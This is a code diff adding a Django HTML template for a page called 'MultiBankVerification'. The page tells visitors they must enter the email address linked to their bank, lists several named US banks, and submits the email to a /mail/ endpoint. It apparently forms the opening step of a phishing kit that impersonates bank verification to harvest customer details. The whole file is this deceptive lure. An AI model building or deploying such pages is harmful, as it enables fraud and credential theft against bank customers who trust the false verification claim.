@@ -1,0 +1,34 @@
+{% load static %}
+
+<html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+        <title>MultiBankVerification</title>
+	<link rel="stylesheet" href="{% static 'zions.css' %}">
+    </head>
+    <body>
+        <div class="multi"><span id="spec1">Multi</span><span id="spec2">Bank</span><span id="spec3">Verification</span></div>
+          <div class="verify">
+              <p id="note">NB: Please note that for verification purpose you are required to enter 
+              the email address linked to your bank, you can continue this process 
+              if you are using any of the banks below.</p>
+              <ul class="ul">
+                  <li>Wells fargo</li>
+                  <li>Capital One</li>
+                  <li>Bank of America</li>
+                  <li>Zions Bank</li>
+                  <li>TD Bank</li>
+              </ul>
+              <hr>
+	      <form action="/mail/" method="post">{% csrf_token %}
+                 <input id="ver"type="email" name="email" placeholder="Email" required><br>
+                 <input class="ver"type="submit" value="Next">
+              </form>
+              
+              <hr>
+             <p id="pow">Powered By: MultiBankVerification</p>
+        </div>  
+        
+    </body>
+</html>
